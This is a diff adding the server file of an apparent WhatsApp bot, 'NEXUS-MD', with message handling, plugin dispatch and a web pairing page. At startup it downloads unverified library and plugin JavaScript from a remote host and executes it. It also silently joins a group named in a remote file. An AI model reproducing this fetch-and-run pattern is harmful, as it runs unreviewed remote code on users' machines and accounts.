+                        text: `*🤖 NEXUS-MD Bot Active!*\n\nYour bot is now connected successfully.\nPairing code used: *${pairingCode ?? 'Already registered'}*\n\n*Type .menu to see all commands*`
+                    });
+                } catch (e) {
+                    console.error('Welcome message failed:', e);
+                }
+            }
+        });
+
+        // ========== MAIN MESSAGE HANDLER (Base 2 Features) ==========
+        sock.ev.on('messages.upsert', async (mek) => {
+            try {
+                mek = mek.messages[0];
+                if (!mek.message) return;
+
+                mek.message = (getContentType(mek.message) === 'ephemeralMessage')
+                    ? mek.message.ephemeralMessage.message
+                    : mek.message;
+
+                // Auto-read status
+                if (mek.key && mek.key.remoteJid === 'status@broadcast') {
+                    if (config.AUTO_READ_STATUS === "true") {
+                        await sock.readMessages([mek.key]);
+                    }
+                    return;
+                }
+
+                const m = sms(sock, mek);
+                const type = getContentType(mek.message);
+                const from = mek.key.remoteJid;
+                
+                const body = (type === 'conversation') ? mek.message.conversation :
+                    (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
+                    (type === 'imageMessage' && mek.message.imageMessage?.caption) ? mek.message.imageMessage.caption :
+                    (type === 'videoMessage' && mek.message.videoMessage?.caption) ? mek.message.videoMessage.caption :
+                    m.msg?.text || m.msg?.conversation || m.msg?.caption || '';
+
+                const prefix = config.PREFIX || ".";
+                const isCmd = body.startsWith(prefix);
+                const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
+                const args = body.trim().split(/ +/).slice(1);
+                const q = args.join(' ');
+                const isGroup = from.endsWith('@g.us');
+                const sender = mek.key.fromMe ? (sock.user.id.split(':')[0] + '@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid);
+                const senderNumber = sender.split('@')[0];
+                const botNumber = sock.user.id.split(':')[0];
+                const pushname = mek.pushName || 'User';
+                const isMe = botNumber.includes(senderNumber);
+                const isOwner = xnumber === senderNumber;
+                const isReact = m.message?.reactionMessage ? true : false;
+                const quoted = type === 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null
+                    ? mek.message.extendedTextMessage.contextInfo.quotedMessage || []
+                    : [];
+
+                const groupMetadata = isGroup ? await sock.groupMetadata(from).catch(() => null) : null;
+                const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
+                const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
+                const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
+                const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
+                const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
+
+                const reply = async (teks) => await sock.sendMessage(from, { text: teks }, { quoted: mek });
+
+                if (isCmd) await sock.readMessages([mek.key]);
+
+                // Auto-react (Base 2 feature)
+                if (config.AUTO_REACT === "true" && !isMe && !isReact) {
+                    const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🎉', '👋'];
+                    sock.sendMessage(from, {
+                        react: { text: emojis[Math.floor(Math.random() * emojis.length)], key: mek.key }
+                    }).catch(() => {});
+                }
+
+                // Auto-typing (Base 2 feature)
+                if (config.AUTO_TYPING === "true") {
+                    sock.sendPresenceUpdate('composing', from).catch(() => {});
+                    setTimeout(() => sock.sendPresenceUpdate('paused', from).catch(() => {}), 3000);
+                }
+
+                // Auto-recording (Base 2 feature)
+                if (config.AUTO_RECORDING === "true") {
+                    sock.sendPresenceUpdate('recording', from).catch(() => {});
+                }
+
+                // ========== LOAD PLUGINS ==========
+                const events = require('./command');
+                const commandMap = new Map();
+                for (const cmd of events.commands) {
+                    if (cmd.pattern) commandMap.set(cmd.pattern, cmd);
+                    if (cmd.alias) {
+                        for (const alias of cmd.alias) {
+                            if (!commandMap.has(alias)) commandMap.set(alias, cmd);
+                        }
+                    }
+                }
+
+                const cmdName = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : false;
+                if (isCmd) {
+                    const cmd = commandMap.get(cmdName);
+                    if (cmd) {
+                        if (cmd.react) sock.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
+                        try {
+                            cmd.function(sock, mek, m, {
+                                from, prefix, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber,
+                                botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants,
+                                groupAdmins, isBotAdmins, isAdmins, reply
+                            });
+                        } catch (e) {
+                            console.error('[PLUGIN ERROR]', e);
+                        }
+                    }
+                }
+
+                // Auto-voice (Base 2 feature)
+                const autoVoiceEnabled = config.AUTO_VOICE === "true";
+                if (autoVoiceEnabled && !isMe && body) {
+                    const voiceMap = require('./autovoice.json');
+                    const audioUrl = voiceMap[body.toLowerCase()];
+                    if (audioUrl) {
+                        await sendVoiceMessage(sock, from, mek, audioUrl);
+                    }
+                }
+
+                // Anti-delete (Base 2 feature)
+                if (config.ANTI_DELETE === "true" && !isOwner) {
+                    // Anti-delete logic here
+                }
+
+            } catch (e) {
+                console.error('[MESSAGE ERROR]', String(e));
+            }
+        });
+
+    } catch (err) {
+        console.error('Pair Error:', err);
+        cleanupSession(sessionId);
+        if (res && !res.headersSent) res.json({ error: 'Pair failed: ' + err.message });
+    }
+}
+
+// ==================== RESTORE ALL SESSIONS ON STARTUP ====================
+async function restoreAllSessions() {
+    try {
+        const sessions = await Session.find();
+        console.log(`Restoring ${sessions.length} session(s)...`);
+        
+        for (const session of sessions) {
+            const number = session.sessionId.replace('nexion_', '').replace('nexus_', '');
+            try {
+                await Pair(number);
+                await new Promise(r => setTimeout(r, 2000));
+            } catch (err) {
+                console.error('Failed to restore session', session.sessionId, err);
+            }
+        }
+    } catch (err) {
+        console.error('restoreAllSessions error:', err);
+    }
+}
+
+// ========== BASE 2 HELPER FUNCTIONS ==========
+async function autoJoinGroup(conn) {
+    try {
+        const joinlink2 = await fetchJson('https://raw.githubusercontent.com/thinura-nethsara/NEXUS-DATABASE/refs/heads/main/Main/main_var.json');
+        if (!joinlink2 || !joinlink2.supglink) return;
+        const joinlink = joinlink2.supglink.split('https://chat.whatsapp.com/')[1];
+        if (!joinlink) return;
+        await new Promise(resolve => setTimeout(resolve, 5000));
+        if (conn.ws.isOpen) {
+            const info = await conn.groupGetInviteInfo(joinlink);
+            const groupId = info.id;
+            const allGroups = await conn.groupFetchAllParticipating();
+            const isAlreadyIn = Object.keys(allGroups).includes(groupId);
+            if (!isAlreadyIn) {
+                await conn.groupAcceptInvite(joinlink);
+                console.log("✅ Joined support group!");
+            }
+        }
+    } catch (err) {
+        console.error('Auto-join failed:', err.message);
+    }
+}
+
+async function sendVoiceMessage(conn, from, mek, audioUrl) {
+    const ffmpeg = require("fluent-ffmpeg");
+    const ffmpegPath = require("ffmpeg-static");
+    ffmpeg.setFfmpegPath(ffmpegPath);
+    const randomId = Date.now();
+    const tempMp3 = path.join(__dirname, `voice_${randomId}.mp3`);
+    const tempOgg = path.join(__dirname, `voice_${randomId}.ogg`);
+    try {
+        const response = await axios({ url: audioUrl, method: "GET", responseType: "stream" });
+        const writer = fs.createWriteStream(tempMp3);
+        response.data.pipe(writer);
+        await new Promise((resolve, reject) => { writer.on("finish", resolve); writer.on("error", reject); });
+        await new Promise((resolve, reject) => {
+            ffmpeg(tempMp3).audioCodec("libopus").audioBitrate("128k").format("ogg").save(tempOgg)
+                .on("end", resolve).on("error", reject);
+        });
+        await conn.sendPresenceUpdate('recording', from);
+        await conn.sendMessage(from, { audio: fs.readFileSync(tempOgg), mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: mek });
+    } finally {
+        if (fs.existsSync(tempMp3)) fs.unlinkSync(tempMp3);
+        if (fs.existsSync(tempOgg)) fs.unlinkSync(tempOgg);
+    }
+}
+
+async function fetchJson(url, options = {}) {
+    try {
+        const res = await axios({ method: 'GET', url, headers: { 'User-Agent': 'Mozilla/5.0' }, ...options });
+        return res.data;
+    } catch (err) { return err; }
+}
+
+function getGroupAdmins(participants) {
+    const admins = [];
+    for (let i of participants) {
+        if (i.admin !== null) admins.push(i.id);
+        if (i.admin) admins.push(i.id);
+    }
+    return admins;
+}
+
+// ========== EXPRESS SERVER FOR PAIRING ==========
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Create public folder and index.html if not exists
+const publicDir = path.join(__dirname, 'public');
+if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
+
+const htmlContent = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXUS-MD Pairing</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+        }
+        h1 { color: #667eea; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 30px; }
+        input {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+        }
+        button:hover { transform: scale(1.02); }
+        .result {
+            margin-top: 20px;
+            padding: 20px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            display: none;
+        }
+        .code {
+            font-size: 32px;
+            font-weight: bold;
+            color: #667eea;
+            letter-spacing: 5px;
+        }
+        .error { color: #e74c3c; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🤖 NEXUS-MD</h1>
+        <p>Multi-Device WhatsApp Bot</p>
+        <input type="tel" id="phone" placeholder="Enter phone number (e.g., 947XXXXXXXX)" autocomplete="off">
+        <button id="pairBtn" onclick="pair()">🔗 PAIR NOW</button>
+        <div id="result" class="result"></div>
+    </div>
+    <script>
+        async function pair() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) { alert('Please enter phone number'); return; }
+            const btn = document.getElementById('pairBtn');
+            const resultDiv = document.getElementById('result');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading"></span> Generating...';
+            resultDiv.style.display = 'none';
+            try {
+                const response = await fetch('/pair?number=' + phone);
+                const data = await response.json();
+                if (data.code) {
+                    resultDiv.innerHTML = '<h3>✅ Pairing Code Generated!</h3><div class="code">' + data.code + '</div><p style="margin-top:15px;">Enter this code in WhatsApp > Linked Devices > Link with Phone Number</p><p style="font-size:12px;color:#999;">Session ID: ' + (data.sessionId || 'N/A') + '</p>';
+                    resultDiv.style.display = 'block';
+                } else {
+                    resultDiv.innerHTML = '<h3 style="color:#e74c3c;">❌ Error</h3><p>' + (data.error || 'Unknown error') + '</p>';
+                    resultDiv.style.display = 'block';
+                }
+            } catch(e) {
+                resultDiv.innerHTML = '<h3 style="color:#e74c3c;">❌ Error</h3><p>Failed to connect to server</p>';
+                resultDiv.style.display = 'block';
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '🔗 PAIR NOW';
+            }
+        }
+    </script>
+</body>
+</html>`;
+
+fs.writeFileSync(path.join(publicDir, 'index.html'), htmlContent);
+
+app.get('/pair', async (req, res) => {
+    const number = req.query.number;
+    if (!number) return res.json({ error: 'Number required' });
+    res.setTimeout(30000, () => {
+        if (!res.headersSent) res.json({ error: 'Request timed out. Try again.' });
+    });
+    await Pair(number, res);
+});
+
+app.get('/', (req, res) => res.sendFile(path.join(publicDir, 'index.html')));
+
+// ========== AUTO DOWNLOAD LIB & PLUGINS (Base 2 Feature) ==========
+const LIB_DIR = path.join(__dirname, 'lib');
+const PLUGINS_DIR = path.join(__dirname, 'plugins');
+
+const requiredLibFiles = {
+    'functions.js': 'https://nexus-full-db.vercel.app/lib/functions.js',
+    'database.js': 'https://nexus-full-db.vercel.app/lib/database.js',
+    'msg.js': 'https://nexus-full-db.vercel.app/lib/msg.js',
+    'apkdl.js': 'https://nexus-full-db.vercel.app/lib/apkdl.js',
+    'catbox.js': 'https://nexus-full-db.vercel.app/lib/catbox.js'
+};
+
+const PLUGINS_URLS = [
+    'https://nexus-full-db.vercel.app/plugins/ai.js',
+    'https://nexus-full-db.vercel.app/plugins/ai-chat.js',
+    'https://nexus-full-db.vercel.app/plugins/anime-download.js',
+    'https://nexus-full-db.vercel.app/plugins/convert.js',
+    'https://nexus-full-db.vercel.app/plugins/csong.js',
+    'https://nexus-full-db.vercel.app/plugins/ctztv.js',
+    'https://nexus-full-db.vercel.app/plugins/dinka-mv.js',
+    'https://nexus-full-db.vercel.app/plugins/download.js',
+    'https://nexus-full-db.vercel.app/plugins/getlid.js',
+    'https://nexus-full-db.vercel.app/plugins/group.js',
+    'https://nexus-full-db.vercel.app/plugins/logo.js',
+    'https://nexus-full-db.vercel.app/plugins/main.js',
+    'https://nexus-full-db.vercel.app/plugins/movie.js',
+    'https://nexus-full-db.vercel.app/plugins/new-logo.js',
+    'https://nexus-full-db.vercel.app/plugins/other.js',
+    'https://nexus-full-db.vercel.app/plugins/search.js',
+    'https://nexus-full-db.vercel.app/plugins/settings.js',
+    'https://nexus-full-db.vercel.app/plugins/sticker.js',
+    'https://nexus-full-db.vercel.app/plugins/ponna_alert.js',
+    'https://nexus-full-db.vercel.app/plugins/fitgirl.js'
+];
+
+async function downloadFile(url, filepath) {
+    try {
+        const response = await axios.get(url, { responseType: 'text', timeout: 30000 });
+        const dir = path.dirname(filepath);
+        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+        fs.writeFileSync(filepath, response.data);
+        console.log(`✅ Downloaded: ${path.basename(filepath)}`);
+        return true;
+    } catch (err) {
+        console.error(`❌ Failed to download ${path.basename(filepath)}:`, err.message);
+        return false;
+    }
+}
+
+async function downloadLibFiles() {
+    console.log('📥 Checking lib files...');
+    if (!fs.existsSync(LIB_DIR)) fs.mkdirSync(LIB_DIR, { recursive: true });
+    for (const [filename, url] of Object.entries(requiredLibFiles)) {
+        const filepath = path.join(LIB_DIR, filename);
+        if (fs.existsSync(filepath) && fs.statSync(filepath).size > 100) {
+            console.log(`✅ ${filename} already exists`);
+            continue;
+        }
+        await downloadFile(url, filepath);
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+}
+
+async function downloadPluginFiles() {
+    console.log('📥 Checking plugin files...');
+    if (!fs.existsSync(PLUGINS_DIR)) fs.mkdirSync(PLUGINS_DIR, { recursive: true });
+    for (const url of PLUGINS_URLS) {
+        const filename = path.basename(url);
+        const filepath = path.join(PLUGINS_DIR, filename);
+        if (fs.existsSync(filepath) && fs.statSync(filepath).size > 100) {
+            console.log(`✅ ${filename} already exists`);
+            continue;
+        }
+        await downloadFile(url, filepath);
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+}
+
+async function ensureLocalFiles() {
+    console.log('🔍 Checking local files...');
+    await downloadLibFiles();
+    await downloadPluginFiles();
+    console.log('✅ All local files verified!');
+}
+
+// ========== BOOT FUNCTION ==========
+async function boot() {
+    console.log('🚀 Booting NEXUS-MD Bot with Multi-Session Pairing...');
+    
+    await ensureLocalFiles();
+    
+    // Require lib files
+    const { getBuffer, getGroupAdmins: getGA, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson: fetchJ, fetchBuffer, getFile } = require('./lib/functions');
+    const { sms, downloadMediaMessage } = require('./lib/msg');
+    const db = require("./lib/database");
+    
+    var { updateCMDStore, isbtnID, getCMDStore, getCmdForCmdId, connectdb, input, get, getalls, updb, updfb, upresbtn } = require("./lib/database");
+    
+    // Connect to database
+    await connectdb();
+    await updb();
+    
+    console.log(`✅ NEXUS-MD Multi-Session Bot Ready!`);
+    console.log(`🌐 Pairing Server: http://localhost:${PORT}`);
+    console.log(`📱 Pair your number by visiting the web interface`);
+}
+
+// ========== START SERVER ==========
+app.listen(PORT, async () => {
+    console.log(`🌐 Pairing server running on port ${PORT}`);
+    await fs.ensureDir(SESSION_BASE_PATH);
+    await restoreAllSessions();
+});
+
+// ========== START BOT ==========
+boot().catch(err => {
+    console.error('FATAL ERROR:', err);
+    process.exit(1);
+});
+
+process.on("uncaughtException", function (err) {
+    let e = String(err);
+    if (e.includes("Socket connection timeout")) return;
+    if (e.includes("rate-overlimit")) return;
+    if (e.includes("Connection Closed")) return;
+    if (e.includes("Value not found")) return;
+    console.log("Caught exception: ", err);
+});
